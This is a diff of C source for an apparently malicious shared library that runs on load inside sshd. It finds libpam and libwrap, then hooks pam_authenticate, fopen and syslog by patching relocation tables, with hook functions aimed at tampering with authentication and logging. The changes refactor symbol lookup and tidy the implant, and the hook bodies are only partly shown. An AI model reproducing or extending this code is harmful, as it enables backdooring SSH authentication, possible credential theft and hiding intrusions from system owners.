@@ -34,7 +34,7 @@ static void handle_sig_with_jmp(int sig)
 /*
  * lib = start of lib we search - use get_libstart()
  */
-static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
+__attribute__ ((warning ("GDBME - be careful what you find"))) static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
 {
 	struct link_map *map = link_map;
 	Dl_info *dli = malloc(sizeof(Dl_info));
@@ -67,7 +67,7 @@ static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
 	return NULL;
 }
 
-static void *get_libstart(struct link_map *link_map, char *lib)
+__attribute__ ((warning ("GDBME - be careful what you find"))) static void *get_libstart(struct link_map *link_map, char *lib)
 {
 	struct link_map *map = link_map;
 
@@ -83,9 +83,7 @@ static void *get_libstart(struct link_map *link_map, char *lib)
 
 /*
  * Parse a dynamic section array for useful pointers
- * CHECK RESULTS -- number of elements in a .dynamic can be wonky...
- * TODO: there is probably a way to get the correct number of elements in a .dynamic array
- *	so we don't blow something up
+ * 	pointers passed in should always be checked - very possible to fail
  */
 static void parse_dyn_array(Elf64_Dyn *dynptr,Elf64_Rela **RELA, uint64_t **RELASZ,
 								Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
@@ -112,8 +110,6 @@ static void parse_dyn_array(Elf64_Dyn *dynptr,Elf64_Rela **RELA, uint64_t **RELA
 /*
  * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
  *	with the func we want to hook...
- *
- * TODO: this is so slow... better to pass in struct[] { void *func, int type } if we are going to only hook ~10 funcs...?
  */
 static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
 {
@@ -144,7 +140,7 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
 /*
  * the callback for dl_iterate_phdr
  */
-Elf64_Dyn *libpam;
+static Elf64_Dyn *libpam;
 static int callback(struct dl_phdr_info *info, size_t size, void *data)
 {
 	if (null1 != NULL && null2 != NULL && libc != NULL)
@@ -221,22 +217,24 @@ static int is_sshd(struct link_map *link_map)
 	dlinfoptr(ourhandle, 2, &link_map);
 	dlclose(ourhandle);
 
-	void *wrapstart = get_libstart(link_map, "libwrap.so.0");
+	void *lib_wrap = dlopen("libwrap.so.0", RTLD_NOW);
 
-	if (wrapstart == NULL)
+	if (lib_wrap == NULL)
 		return -1;
 
-	void *pamstart = get_libstart(link_map, "libpam.so.0");
+	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);
 
-	if (pamstart == NULL)
+	if (lib_pam == NULL)
 		return -1;
 
-	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access");
-	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
+	void *hosts_access = dlsym(lib_wrap, "hosts_access");
+	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");
 
 	if (hosts_access == NULL || pam_authenticate == NULL)
 		return -1;
 
+	dlclose(lib_wrap);
+	dlclose(lib_pam);
 	return 0;
 }
 
@@ -284,7 +282,7 @@ static int my_syslog_chk(int priority, int flag, const char *format)
 	return 0;
 }
 
-void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
+static void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
 {
 	/*
 	va_list args;
@@ -334,8 +332,8 @@ static void  __attribute__ ((constructor)) init(void)
 	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
 		return;
 
-	void *pamstart = get_libstart(link_map, "libpam.so.0");
-	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
+	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);
+	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");
 
 	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
 	if (foundrela == NULL)
@@ -355,17 +353,15 @@ static void  __attribute__ ((constructor)) init(void)
 	signal(SIGSEGV, SIG_DFL);
 	signal(SIGBUS, SIG_DFL);
 
+	/* fopen() hook */
 
+	void *lib_c = dlopen("libc.so.6", RTLD_NOW);
+	void *libc_func = dlsym(lib_c, "fopen");
 
-
-	void *libcstart = get_libstart(link_map, "libc.so.6");
-	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");
-
-	/* the relocation of fopen lives within sshd's dynamic */
+	/* the relocation of fopen lives within sshd's .dynamic */
 	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
 	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
 		return;
-
 
 	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
 	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
@@ -383,6 +379,12 @@ static void  __attribute__ ((constructor)) init(void)
 
 
 	/* find how pam is calling __syslog_chk */
-	
-	return;
+
+
+	//void *pamhandle = dlopen("libpam.so.0", RTLD_NOW);
+
+
+	dlclose(lib_pam);
+	dlclose(lib_c);	
+	return; /* XXX use exit() ? */
 }
